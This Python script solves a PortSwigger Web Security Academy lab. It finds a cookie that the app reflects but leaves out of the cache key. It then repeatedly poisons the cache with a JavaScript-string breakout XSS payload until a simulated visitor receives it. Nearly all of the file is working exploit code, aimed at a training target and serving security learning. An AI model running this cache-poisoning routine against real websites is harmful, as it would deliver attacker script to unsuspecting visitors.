#!/usr/bin/env python3
"""
Web cache poisoning with an unkeyed cookie
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 02-unkeyed-cookie.md

What this does:
    Discovers which cookie the app reflects into a JavaScript object without
    being part of the cache key, then poisons it with a JS-arithmetic
    breakout ("value"-alert(1)-"value") since the reflection context here is
    a JS string, not an HTML attribute. Loops the poison against the ~30s
    cache window until the simulated visitor picks it up.

Usage:
    python 02-unkeyed-cookie.py <lab-url>
    e.g. python 02-unkeyed-cookie.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import secrets
import sys
import httpx


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def poison_via_cookie(client: httpx.AsyncClient, url: str, cookie_name: str,
                             payload: str, max_attempts: int = 30) -> bool:
    print(f"[*] Poisoning {url} via cookie '{cookie_name}'...")
    for attempt in range(max_attempts):
        r = await client.get(url, cookies={cookie_name: payload})
        if _is_cache_miss(dict(r.headers)):
            await asyncio.sleep(0.2)
            verify = await client.get(url)
            if payload in verify.text:
                print(f"[+] Cache poisoned via cookie on attempt {attempt + 1}!")
                return True
        await asyncio.sleep(0.5)
    print(f"[-] Cookie poison failed after {max_attempts} attempts")
    return False


async def solve(lab_url: str) -> None:
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: find which cookie is reflected. Start with whatever the
        # baseline response actually sets (fehost, in our lab instance).
        r = await client.get(lab_url)
        cookies = dict(r.cookies)
        print(f"[*] Cookies from baseline: {list(cookies.keys())}")

        canary = f"canary{secrets.token_hex(3)}"
        reflected_cookie = None

        for name in cookies:
            cb = _cache_buster()
            test_cookies = cookies.copy()
            test_cookies[name] = canary
            r = await client.get(f"{lab_url}/?cb={cb}", cookies=test_cookies)
            if canary in r.text:
                reflected_cookie = name
                print(f"[+] Cookie '{name}' is reflected in response")
                break

        if not reflected_cookie:
            for name in ["fehost", "lang", "tracking", "prefs", "session"]:
                cb = _cache_buster()
                r = await client.get(f"{lab_url}/?cb={cb}", cookies={name: canary})
                if canary in r.text:
                    reflected_cookie = name
                    print(f"[+] Cookie '{name}' is reflected in response")
                    break

        if not reflected_cookie:
            print("[-] No reflected cookie found -- cannot proceed")
            return

        # Step 2: JS-arithmetic breakout -- the reflection lands inside a JS
        # string, not raw HTML, so a "></script> tag breakout wouldn't fire.
        xss_payload = 'someValue"-alert(1)-"someValue'
        poisoned = await poison_via_cookie(client, lab_url, reflected_cookie, xss_payload)

        if not poisoned:
            print("[-] Not solved -- cache never confirmed a poisoned miss")
            return

        await asyncio.sleep(3)
        if await _lab_solved(client, lab_url):
            print("[+] Lab solved -- poisoned response served to a clean request.")
        else:
            print("[-] Not solved yet -- poison landed but the simulated visitor hasn't hit it.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
